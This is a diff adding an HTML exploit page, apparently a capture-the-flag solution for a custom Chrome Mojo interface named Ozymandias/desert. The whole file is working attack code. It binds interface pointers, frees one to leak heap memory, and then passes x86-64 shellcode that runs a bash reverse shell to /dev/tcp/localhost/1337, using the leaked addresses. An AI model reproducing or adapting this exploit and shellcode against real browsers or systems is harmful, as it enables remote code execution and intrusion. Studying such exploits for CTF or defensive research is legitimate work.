@@ -1,0 +1,58 @@
+<script src="/mojojs/mojo_bindings.js"></script>
+<script src="/mojojs/gen/third_party/blink/public/mojom/desert.mojom.js"></script>
+<script>
+  const log = msg => {
+    fetch("/log?log=" + encodeURIComponent(msg));
+  }
+
+  const sleep = ms => new Promise(res => setTimeout(res, ms));
+
+  window.onerror = e => log(e);
+
+  (async () => {
+  try{
+
+  const IS_EASY = false;
+  const easy_offset = IS_EASY ? 100: 0;
+  
+  const ptrs = [];
+  
+  for (let i = 0; i < easy_offset + 2; i++) {
+    const ptr = new blink.mojom.OzymandiasPtr();
+    Mojo.bindInterface(blink.mojom.Ozymandias.name, mojo.makeRequest(ptr).handle);
+
+    ptrs.push(ptr);
+  }
+
+  await sleep(100);
+
+  ptrs[easy_offset + 0].ptr.reset();
+
+  const { decay } = await ptrs[1].despair({
+    wrecks: [
+      {
+        size: 0x100,
+        lengthToUse: IS_EASY ? 0x200: 0x100,
+        type: blink.mojom.DesertType.EMPTY,
+        data: IS_EASY ? undefined: {
+          $tag: mojoBase.mojom.BigBuffer.Tags.invalidBuffer,
+          invalidBuffer: true
+        }
+      }
+    ]
+  });
+
+  const leak = new BigUint64Array(new Uint8Array(decay[0]["$data"]).buffer);
+
+  ptrs[1].visage("\x48\x31\xd2\x52\x48\x8d\x05\x31\x00\x00\x00\x50\x48\x8d\x05\x26\x00\x00\x00\x50\x48\x8d\x05\x14\x00\x00\x00\x50\x48\x89\xe6\x48\x8d\x3d\x09\x00\x00\x00\x48\xc7\xc0\x3b\x00\x00\x00\x0f\x05\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x00\x2d\x63\x00/bin/bash -i >& /dev/tcp/localhost/1337 0>&1\x00".split("").map(a => a.charCodeAt(0)), {
+    high: leak[(IS_EASY ? 0x100 / 8: 0) + 2],
+    low: leak[(IS_EASY ? 0x100 / 8: 0) + 3]
+  });
+
+  }catch(e){
+    log("error");
+    log(": " + e.stack);
+  }
+  })();
+
+</script>
